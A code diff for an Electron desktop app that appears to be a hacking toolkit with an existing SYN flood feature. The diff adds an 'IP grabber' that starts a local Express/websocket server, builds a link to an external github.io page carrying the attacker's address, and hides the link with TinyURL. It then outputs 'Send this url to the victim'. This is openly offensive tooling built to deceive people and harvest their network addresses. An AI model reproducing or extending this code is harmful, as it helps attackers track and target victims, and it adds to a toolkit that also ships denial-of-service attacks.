@@ -1,7 +1,12 @@
 const { exec, spawn } = require("node:child_process");
 const { ipcRenderer } = require("electron");
-const { Console } = require("node:console");
-const path = require("node:path");
+const prettylink = require('prettylink');
+const ip = require("ip");
+const ws = require("ws");
+const cors = require("cors");
+const express = require("express");
+const app = express();
+app.use(cors());
 
 document.getElementById("minimizeBtn").addEventListener("click", () => {
     ipcRenderer.send("minimizeApp");
@@ -235,5 +240,28 @@ if(document.getElementById("synFloodStartBtn")) {
     });
     document.getElementById("synFloodSave").addEventListener("click", () => {
         download("synfloodlog", "synFloodOutput");
+    });
+}
+
+if(document.getElementById("localIpGrabberBtn")) {
+    let server;
+    document.getElementById("localIpGrabberBtn").addEventListener("click", () => {
+        const output = document.getElementById("localIpGrabberOutput");
+        const redirectUrl = document.getElementById("localIpGrabberRedirect");
+
+        if(server != undefined) {
+            server.close()
+        }
+        
+        server = app.listen(3000, () => {
+            const url = `https://zhiftydk.github.io/getlocalip?ws=ws://${ip.address()}:3000&r=${redirectUrl.value}`;
+            const tinyurl = new prettylink.TinyURL();
+            tinyurl.short(url).then(url => {
+                output.value += `Send this url to the victim: ${url}\r\n`;
+            });
+        });
+    });
+    document.getElementById("localIpGrabberSave").addEventListener("click", () => {
+        download("localipgrabberlog", "localIpGrabberOutput");
     });
 }
